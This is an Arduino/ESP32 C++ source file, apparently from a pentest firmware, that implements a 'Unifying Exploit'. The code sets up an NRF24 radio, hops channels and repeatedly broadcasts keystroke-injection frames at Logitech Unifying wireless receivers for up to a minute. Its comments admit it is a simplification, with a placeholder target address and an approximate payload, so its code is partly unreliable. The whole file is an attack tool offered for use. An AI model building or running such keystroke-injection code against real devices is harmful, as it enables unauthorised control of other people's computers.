#include <Arduino.h>
#include "nrf_unifying.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "nrf_common.h"

using namespace nrf_common;

void nrf_unifying_exploit() {
    NRF24_MODE mode = nrf_setMode();
    if (!nrf_start(mode)) {
        displayError("NRF24 not found");
        vTaskDelay(500 / portTICK_PERIOD_MS);
        return;
    }

    drawMainBorder();
    tft.setCursor(10, 35);
    tft.setTextSize(FM);
    tft.println("Unifying Exploit");
    tft.setTextSize(FP);

    if (CHECK_NRF_SPI(mode)) {
        NRFradio.setAutoAck(false);
        NRFradio.setPALevel(RF24_PA_MAX);
        NRFradio.setDataRate(RF24_2MBPS); // Unifying uses 2mbps
        NRFradio.setPayloadSize(22);      // Standard unifying packet length usually 22
    }

    tft.setCursor(10, 60);
    tft.println("Target: Logitech Unifying");
    tft.setCursor(10, 80);
    tft.println("Broadcasting exploit...");

    int current_channel = 5;
    uint32_t attempts = 0;

    // Simplification of exploiting unifying unencrypted keystrokes
    uint8_t payload[22] = {
        0x00, 0xC1, 0x01, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    }; // Key press 'A' frame equivalent

    uint32_t start_time = millis();
    while (!check(EscPress) && (millis() - start_time < 60000)) {
        if (CHECK_NRF_SPI(mode)) {
            NRFradio.setChannel(current_channel);
            // Some unknown / promiscuous address attempt for unencrypted injection
            uint8_t target_mac[5] = {0xAA, 0xAA, 0xAA, 0xAA, 0xAA}; // In real cases, sniffed MAC
            NRFradio.openWritingPipe(target_mac);

            NRFradio.write(payload, sizeof(payload));
            attempts++;

            current_channel += 3;
            if (current_channel > 80) current_channel = 5;

            if (attempts % 100 == 0) {
                tft.fillRect(10, 100, tftWidth - 20, 20, bruceConfig.bgColor);
                tft.setCursor(10, 100);
                tft.printf("Payloads sent: %d", attempts);
            }
        }

        if (CHECK_NRF_UART(mode) || CHECK_NRF_BOTH(mode)) {
            NRFSerial.println("UNI_EXPLOIT_" + String(current_channel));
        }

        vTaskDelay(1 / portTICK_PERIOD_MS);
    }

    if (CHECK_NRF_UART(mode) || CHECK_NRF_BOTH(mode)) NRFSerial.println("OFF");
}
